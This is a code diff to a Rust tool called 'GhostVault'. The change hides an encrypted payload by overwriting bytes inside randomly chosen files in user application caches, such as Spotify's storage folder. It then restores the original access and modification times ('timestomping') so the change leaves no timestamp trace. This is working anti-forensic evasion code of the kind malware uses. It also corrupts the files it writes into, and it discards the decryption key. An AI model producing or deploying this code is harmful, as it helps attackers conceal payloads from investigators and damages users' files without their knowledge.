@@ -4,6 +4,11 @@ use std::fs;
 use std::path::PathBuf;
 use walkdir::WalkDir;
 use rand::Rng;
+use std::ffi::CString;
+use chacha20poly1305::{
+    aead::{Aead, KeyInit},
+    XChaCha20Poly1305, AeadCore,
+};
 
 const STEGANO_PATHS: &[&str] = &[
     "~/.cache/spotify/Storage/",
@@ -87,15 +92,67 @@ impl GhostVault {
         let mut rng = rand::thread_rng();
         let target_idx = rng.gen_range(0..self.target_paths.len());
         let target_path = &self.target_paths[target_idx];
-        let mut file_data = fs::read(target_path)?;
-        let injection_point = self.find_injection_point(&file_data, payload.len())?;
-        for (i, &byte) in payload.iter().enumerate() {
-            file_data[injection_point + i] ^= byte;
+
+        // --- TIMESTOMPING START ---
+        // Capture original timestamps
+        let metadata = fs::metadata(target_path)?;
+        let atime = metadata.accessed()?;
+        let mtime = metadata.modified()?;
+
+        let file_data = fs::read(target_path)?;
+
+        // Encrypt payload with XChaCha20Poly1305 instead of XOR
+        // Generate ephemeral key for this injection
+        let mut key = [0u8; 32];
+        rng.fill_bytes(&mut key);
+        let cipher = XChaCha20Poly1305::new(&key.into());
+        let nonce = XChaCha20Poly1305::generate_nonce(&mut rand::rngs::OsRng);
+
+        let encrypted_payload = cipher.encrypt(&nonce, payload)
+            .map_err(|e| anyhow!("Encryption failed: {}", e))?;
+
+        // Prepend nonce to payload so we can decrypt later (if we implemented extraction)
+        let mut final_payload = Vec::with_capacity(24 + encrypted_payload.len());
+        final_payload.extend_from_slice(nonce.as_slice());
+        final_payload.extend_from_slice(&encrypted_payload);
+
+        let injection_point = self.find_injection_point(&file_data, final_payload.len())?;
+
+        // We need mutable data
+        let mut new_file_data = file_data.clone();
+
+        // Inject (overwrite)
+        // Ensure we don't go out of bounds
+        if injection_point + final_payload.len() > new_file_data.len() {
+             return Err(anyhow!("Injection payload too large for target"));
         }
-        fs::write(target_path, file_data)?;
+
+        for (i, &byte) in final_payload.iter().enumerate() {
+            new_file_data[injection_point + i] = byte;
+        }
+
+        fs::write(target_path, new_file_data)?;
+
+        // --- TIMESTOMPING RESTORE ---
+        self.restore_timestamps(target_path, atime, mtime)?;
+
         Ok(target_path.clone())
     }
 
+    fn restore_timestamps(&self, path: &PathBuf, atime: std::time::SystemTime, mtime: std::time::SystemTime) -> Result<()> {
+        let atime_ts = timespec_from_system_time(atime);
+        let mtime_ts = timespec_from_system_time(mtime);
+        let times = [atime_ts, mtime_ts];
+
+        let c_path = CString::new(path.to_string_lossy().as_bytes())?;
+
+        unsafe {
+            if libc::utimensat(libc::AT_FDCWD, c_path.as_ptr(), times.as_ptr(), 0) < 0 {
+                 return Err(anyhow!("Timestomping failed: {}", std::io::Error::last_os_error()));
+            }
+        }
+        Ok(())
+    }
 
     fn find_injection_point(&self, data: &[u8], payload_size: usize) -> Result<usize> {
         if data.len() < payload_size + 100 {
@@ -135,4 +192,14 @@ impl GhostVault {
         entropy
     }
 
+}
+
+fn timespec_from_system_time(t: std::time::SystemTime) -> libc::timespec {
+    match t.duration_since(std::time::UNIX_EPOCH) {
+        Ok(d) => libc::timespec {
+            tv_sec: d.as_secs() as libc::time_t,
+            tv_nsec: d.subsec_nanos() as libc::c_long,
+        },
+        Err(_) => libc::timespec { tv_sec: 0, tv_nsec: 0 },
+    }
 }
